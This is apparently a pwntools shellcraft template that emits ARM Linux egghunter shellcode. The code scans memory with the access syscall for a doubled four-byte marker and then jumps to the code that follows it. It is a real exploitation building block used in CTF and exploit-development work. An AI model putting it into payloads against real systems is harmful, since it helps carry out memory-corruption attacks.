<% from pwnlib.shellcraft.arm import mov %>
<% from pwnlib.util.packing import unpack %>
<% from pwnlib import constants %>
<%page args="egg"/>
<%docstring>
    egghunter(egg)

    Searches for an egg, which is either a four byte integer
    or a four byte string. The egg must appear twice in a row.
    When the egg has been found the egghunter branches to the
    address following it.
</%docstring>
<%
    if not isinstance(egg, (int, long)):
        if not len(egg) == 4:
            raise Exception('Egg should be either an integer or a four byte string')
        egg = unpack(egg)
%>
egghunter:
    eor r1, r1, r1
    mov r2, r1

    /* Put egg in r3 */
    ${mov('r3', egg)}

next_page:
    mvn r2, r2, lsr #0x0c
    mvn r2, r2, lsl #0x0c

next_byte:
    add r2, r2, #0x01

    add r0, r2, #0x07
    mov r7, #0x21
    swi #0

    /* EFAULT = ${constants.linux.arm.EFAULT} means unmapped memory */
    cmn r0, #${constants.linux.arm.EFAULT}
    beq next_page

    ldm r2, {r4, r5}

    cmp r4, r3
    bne next_byte
    cmp r5, r3
    bne next_byte

egg_found:
    add r2, r2, #0x08
    bx  r2
